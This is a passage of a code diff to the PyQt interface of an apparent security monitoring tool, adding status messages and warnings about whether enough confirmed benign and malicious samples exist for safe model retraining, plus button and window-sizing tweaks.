+            balanced     = anchor_stats.get("balanced", False)
+            benign_count = anchor_stats.get("benign", 0)
+            mal_count    = anchor_stats.get("malicious", 0)
+            min_needed   = anchor_stats.get("min_per_class", 5)
+            stale_count  = anchor_stats.get("stale", 0)
+            expired      = anchor_stats.get("expired", 0)
+
+            if not ready:
+                benign_needed = max(0, min_needed - benign_count)
+                mal_needed    = max(0, min_needed - mal_count)
+                parts = []
+                if benign_needed > 0:
+                    parts.append(f"{benign_needed} more SAFE confirmations needed")
+                if mal_needed > 0:
+                    parts.append(f"{mal_needed} more MALICIOUS confirmations needed")
+                msg = f"⛔ Retraining blocked: {' and '.join(parts)}"
+                self._anchor_balance_lbl.setText(msg)
                 self._anchor_balance_lbl.setStyleSheet(
-                    f"color: {THEME['green']}; font-size: 10px; padding: 4px;"
+                    f"color: {THEME['red']}; font-size: 10px; padding: 4px;"
                 )
-            else:
-                total = anchor_stats.get("total", 0)
-                if total < 4:
-                    msg = f"⚠ Only {total} anchor(s) — confirm more verdicts to build the store"
-                else:
-                    msg = "⚠ Anchor store is imbalanced — confirm verdicts of both classes"
+            elif not balanced:
+                msg = "⚠ Anchor store imbalanced — confirm more of the minority class"
                 self._anchor_balance_lbl.setText(msg)
                 self._anchor_balance_lbl.setStyleSheet(
                     f"color: {THEME['yellow']}; font-size: 10px; padding: 4px;"
+                )
+            else:
+                extra = []
+                if stale_count > 0:
+                    extra.append(f"{stale_count} anchors older than {anchor_stats.get('recent_days',90)}d")
+                if expired > 0:
+                    extra.append(f"{expired} expired")
+                msg = "✓ Anchor store ready for safe retraining"
+                if extra:
+                    msg += f"  ({', '.join(extra)})"
+                self._anchor_balance_lbl.setText(msg)
+                self._anchor_balance_lbl.setStyleSheet(
+                    f"color: {THEME['green']}; font-size: 10px; padding: 4px;"
                 )
 
             # Conflict table
@@ -3199,6 +3358,38 @@ class CyberSentinelGUI(QMainWindow):
 
     def _force_retrain(self):
         self._al_console.clear_console()
+
+        # Warn analyst if anchor store is not ready — Force Retrain bypasses the
+        # threshold block but the analyst should know the risk.
+        try:
+            from modules.adaptive_learner import get_learner, MIN_ANCHORS_PER_CLASS
+            stats = get_learner().get_anchor_stats()
+            if not stats.get("ready_to_train", False):
+                benign = stats.get("benign", 0)
+                mal    = stats.get("malicious", 0)
+                self._al_console.append_line(
+                    f"⚠ WARNING: Anchor store insufficient "
+                    f"({benign} benign, {mal} malicious — need {MIN_ANCHORS_PER_CLASS} each).",
+                    THEME["yellow"]
+                )
+                self._al_console.append_line(
+                    "   Proceeding anyway (Force Retrain overrides safety check).",
+                    THEME["yellow"]
+                )
+                self._al_console.append_line(
+                    "   Class imbalance risk is ELEVATED. "
+                    "Confirm more verdicts in Analyst Feedback after retraining.",
+                    THEME["muted"]
+                )
+            elif not stats.get("balanced", True):
+                self._al_console.append_line(
+                    f"⚠ WARNING: Anchor store imbalanced "
+                    f"({stats.get('benign',0)} benign vs {stats.get('malicious',0)} malicious).",
+                    THEME["yellow"]
+                )
+        except Exception:
+            pass
+
         self._al_console.append_line("[*] Starting forced retraining session...", THEME["blue"])
 
         def _do():
@@ -3291,7 +3482,7 @@ class CyberSentinelGUI(QMainWindow):
         btn_row = QHBoxLayout()
         refresh_btn = QPushButton("↻  Refresh")
         refresh_btn.setObjectName("primary")
-        refresh_btn.setFixedWidth(110)
+        refresh_btn.setMinimumWidth(110)
         refresh_btn.clicked.connect(self._refresh_explainability)
         btn_row.addWidget(refresh_btn)
         btn_row.addStretch()
@@ -3420,7 +3611,7 @@ class CyberSentinelGUI(QMainWindow):
         btn_row = QHBoxLayout()
         refresh_btn = QPushButton("↻  Refresh")
         refresh_btn.setObjectName("primary")
-        refresh_btn.setFixedWidth(110)
+        refresh_btn.setMinimumWidth(110)
         refresh_btn.clicked.connect(self._refresh_risk_scores)
         btn_row.addWidget(refresh_btn)
         btn_row.addStretch()
@@ -3571,7 +3762,7 @@ class CyberSentinelGUI(QMainWindow):
         btn_row = QHBoxLayout()
         refresh_btn = QPushButton("↻  Refresh")
         refresh_btn.setObjectName("primary")
-        refresh_btn.setFixedWidth(110)
+        refresh_btn.setMinimumWidth(110)
         refresh_btn.clicked.connect(self._refresh_drift)
         btn_row.addWidget(refresh_btn)
         btn_row.addStretch()
@@ -3698,6 +3889,19 @@ def main():
     app.setPalette(palette)
 
     window = CyberSentinelGUI()
+
+    # Screen-adaptive sizing: use 90% of available screen, never smaller than 1100×700
+    screen = app.primaryScreen()
+    if screen:
+        geom      = screen.availableGeometry()
+        win_w     = max(1100, int(geom.width()  * 0.90))
+        win_h     = max(700,  int(geom.height() * 0.90))
+        win_x     = geom.x() + (geom.width()  - win_w) // 2
+        win_y     = geom.y() + (geom.height() - win_h) // 2
+        window.setGeometry(win_x, win_y, win_w, win_h)
+    else:
+        window.resize(1280, 800)
+
     window.show()
     window._show_page("dashboard")
     sys.exit(app.exec())
